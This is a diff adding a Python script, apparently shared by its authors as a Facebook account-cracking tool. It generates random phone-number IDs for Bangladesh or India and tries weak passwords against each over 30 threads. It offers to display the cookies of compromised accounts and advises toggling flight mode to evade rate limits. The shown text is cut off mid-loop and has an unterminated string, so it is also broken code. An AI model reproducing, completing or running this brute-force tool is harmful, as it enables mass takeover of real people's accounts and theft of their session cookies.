@@ -1,0 +1,81 @@
+#-----------------------[ INFO-CODE ]-----------------------#
+"""WRITTEN   : Adonis/Karma
+Facebook Account : Adonis Vkive"""
+#-----------------------[ IMPORT-CODE ]-----------------------#
+import os
+import sys
+import marshal, base64, zlib
+from os import path
+import os,base64,zlib,pip,urllib
+try:
+        os.system('clear')
+        import os,requests,json,time,re,random,sys,uuid,string,subprocess
+        from string import *
+        from concurrent.futures import ThreadPoolExecutor as tred
+except ModuleNotFoundError:
+        os.system('pip install requests futures==2 > /dev/null')
+except:pass
+#-----------------------[ COLOR-CODE ]-----------------------#
+a='\x1b[38;5;118m';b='\x1b[38;5;119m';c='\x1b[38;5;120m';d='\x1b[38;5;121m';e='\x1b[38;5;122m';g='\x1b[38;5;46m';r='\x1b[38;5;196m';w='\033[1;37m'
+#-----------------------[ HEXXX-CODE ]-----------------------#
+user=[];ok=[];cp=[];twf=[];cpx=[];cokix=[];plist=[];loop=0
+#-----------------------[ SC-CODE ]-----------------------#
+main_x = '(1) file cloning (\n (2) Exit menu';bd_x = '017 | 018 | 019';ind_x = '+91639 | +91600 | +91620';line_x = '==================================================';cp_x = 'Do You Went Show Cp Ids (Y|N)';coki_x = 'Do You Went Show Cookies (Y|N)';c = 'Choice'
+#-----------------------[ LOGO-CODE ]-----------------------#
+logo = f"""{w}
+         dMMMMb  dMP dMP .aMMMb  .aMMMb dMMMMMMP \n        dMP"dMP dMP dMP dMP"dMP dMP"dMP   dMP    \n       dMMMMK" dMMMMMP dMP dMP dMP dMP   dMP     \n      dMP.aMF dMP dMP dMP.aMP dMP.aMP   dMP      \n     dMMMMP" dMP dMP  VMMMP"  VMMMP"   dMP       
+{line_x}\n (+) Developer : Bhoot Cyber\n (+) Facebook  : ADONIS VKIVE\n (+)
+#-----------------------[ CLEAR-CODE ]-----------------------#
+def fresh():os.system('clear');print(logo)
+#-----------------------[ LINE-CODE ]-----------------------#
+def line():print(f'{line_x}')
+#-----------------------[ MAIN-CODE ]-----------------------#
+def Main():
+    fresh();print(f' (1) Random Cracking \n (2) Help Senter \n (3) Exit Manu ');line()
+    manu = input(f' (+) {c} : ')
+    if manu in ['1','01']:country()
+    elif manu in ['2','02']:os.system('xdg-open https://www.facebook.com/cyber.king.tanim');Main()
+    else:Main()
+#-----------------------[ COUNTRY-CODE ]-----------------------#
+def country():
+    fresh();print(f' {main_x} ');line()
+    con_ck = input(f' (+) {c} : ')
+    if con_ck in ['1','01']:rndm_bd()
+    elif con_ck in ['2','02']:rndm_ind()
+    else:Main()
+#-----------------------[ RNDM-CODE-BD ]-----------------------#
+def rndm_bd():
+        fresh();print(f' (+) Example : {bd_x} ');line();code = input(f' (+) Find Sim Code : ')
+        fresh();print(f' (+) Example : 1000 | 2000 | 5000 ');line();limit = int(input(f' (+) Find Limit : '))
+        fresh();print(f' (+) {cp_x} ');line();cpy = input(f' (+) {c} (Y|N) : ')
+        if cpy in ['n','N','no','NO','2','02']:cpx.append(f'n')
+        else:cpx.append(f'y')
+        fresh();print(f' (+) {coki_x} ');line();cokiy = input(f' (+) {c} (Y|N) : ')
+        if cokiy in ['n','N','no','NO','2','02']:cokix.append(f'n')
+        else:cokix.append(f'y')
+        for Kid in range(limit):Bhootxx = ''.join(random.choice(string.digits) for _ in range(7));user.append(Bhootxx)
+        with tred(max_workers=30) as Tanim:
+                tl = str(len(user))
+                fresh();print(f' (+) Sim Code    : {code} \n (+) Total Limit : {limit} \n (+) Use Flight Mode Every 5 Minutes...');line()
+                for love in user:
+                        ids = code + love 
+                        pasx = [love,ids,ids[:8],ids[:7],'@@@###','aabbcc','aaabbb','১২৩৪৫৬','১২৩৪৫৬৭৮','102030','405060','708090']
+                        Tanim.submit(rndmx,ids,pasx,tl)
+#-----------------------[ RNDM-CODE-INDIA ]-----------------------#
+def rndm_ind():
+        fresh();print(f' (+) Example : {ind_x}  ');line();code = input(f' (+) Find Sim Code : ')
+        fresh();print(f' (+) Example : 1000 | 2000 | 5000 ');line();limit = int(input(f' (+) Find Limit : '))
+        fresh();print(f' (+) {cp_x} ');line();cpy = input(f' (+) {c} (Y|N) : ')
+        if cpy in ['n','N','no','NO','2','02']:cpx.append(f'n')
+        else:cpx.append(f'y')
+        fresh();print(f' (+) {coki_x} ');line();cokiy = input(f' (+) {c} (Y|N) : ')
+        if cokiy in ['n','N','no','NO','2','02']:cokix.append(f'n')
+        else:cokix.append(f'y')
+        for Kid in range(limit):Bhootxx = ''.join(random.choice(string.digits) for _ in range(7));user.append(Bhootxx)
+        with tred(max_workers=30) as Tanim:
+                tl = str(len(user))
+                fresh();print(f' (+) Sim Code    : {code} \n (+) Total Limit : {limit} \n (+) Use Flight Mode Every 5 Minutes...');line()
+                for love in user:
+                        ids = code + love 
+                        pasx = ['57575751','57273200','59039200',ids,love,ids[3:]]
+        
